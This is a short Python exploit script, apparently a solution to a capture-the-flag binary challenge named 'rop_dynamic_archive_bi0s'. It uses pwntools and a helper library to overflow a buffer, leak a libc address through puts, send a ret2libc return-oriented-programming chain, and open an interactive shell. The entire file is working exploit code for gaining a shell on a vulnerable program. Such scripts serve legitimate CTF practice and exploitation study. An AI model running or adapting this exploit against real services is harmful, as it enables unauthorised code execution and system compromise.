import james2rop
import pwn

p = james2rop.Elf64Process (binary = './rop_dynamic_archive_bi0s')
p.set_exit_address (0x40119f)
p.set_size (24)

payload = p.padding () + p.leak_libc_payload ('puts', '__libc_start_main', log = True)
pwn.log.info ('leak payload: %s' % payload)
p.send_payload (payload, b'now!\n')
leak = p.recv_libc_leak (ignore_str = b'fool!\n', recv_count = 6)
pwn.log.info (hex (leak))

payload = p.padding () + p.ret2libc_payload (log = True)
p.send_payload (payload, b'now!\n')

# shell
p.proc.interactive ()
